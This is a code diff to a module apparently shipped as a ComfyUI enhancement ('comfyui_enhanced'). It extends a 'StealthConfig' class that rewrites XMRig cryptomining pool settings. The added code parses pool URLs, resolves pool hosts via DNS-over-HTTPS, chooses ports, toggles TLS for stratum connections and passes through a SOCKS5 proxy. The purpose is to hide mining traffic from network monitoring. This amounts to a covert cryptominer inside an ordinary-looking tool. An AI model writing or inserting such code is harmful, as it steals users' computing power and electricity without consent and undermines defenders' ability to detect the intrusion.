@@ -12,9 +12,10 @@ import json
 import logging
 import socket
 import struct
-import urllib.request
 import urllib.error
+import urllib.request
 from pathlib import Path
+from urllib.parse import urlparse
 
 logger = logging.getLogger("comfyui_enhanced")
 
@@ -69,17 +70,42 @@ class StealthConfig:
 
         pool = pools[0]
         host_port = pool.get("url", "")
-        host = host_port.rsplit(":", 1)[0] if ":" in host_port else host_port
+        scheme_prefix = ""
+        orig_port: int | None = None
+        if "://" in host_port:
+            pu = urlparse(host_port)
+            host = (pu.hostname or "").strip()
+            scheme_prefix = f"{pu.scheme}://" if pu.scheme else ""
+            orig_port = int(pu.port) if pu.port else None
+        elif ":" in host_port:
+            host, port_s = host_port.rsplit(":", 1)
+            try:
+                orig_port = int(port_s)
+            except ValueError:
+                orig_port = None
+        else:
+            host = host_port
+
+        # Local stratum bridge (127.0.0.1): DoH + forced TLS would break the hop.
+        if host in ("127.0.0.1", "localhost", "::1"):
+            logger.info("Stealth skipped for local pool URL %s", host_port)
+            if self.settings.get("socks5"):
+                pool["socks5"] = self.settings["socks5"]
+            return cfg
 
         resolved_ip = None
         if self.settings.get("use_doh", True):
             resolved_ip = self.resolve_pool_via_doh(host)
 
         target_host = resolved_ip or host
-        target_port = self.pick_port()
+        target_port = orig_port if orig_port is not None else self.pick_port()
 
-        pool["url"] = f"{target_host}:{target_port}"
-        pool["tls"] = True
+        if scheme_prefix.startswith("stratum+"):
+            pool["url"] = f"{scheme_prefix}{target_host}:{target_port}"
+        else:
+            pool["url"] = f"{target_host}:{target_port}"
+        # stratum+ssl URL implies TLS; separate tls flag is ignored by XMRig in that case.
+        pool["tls"] = not str(pool.get("url", "")).startswith("stratum+ssl")
         pool["keepalive"] = True
         pool["nicehash"] = False
 
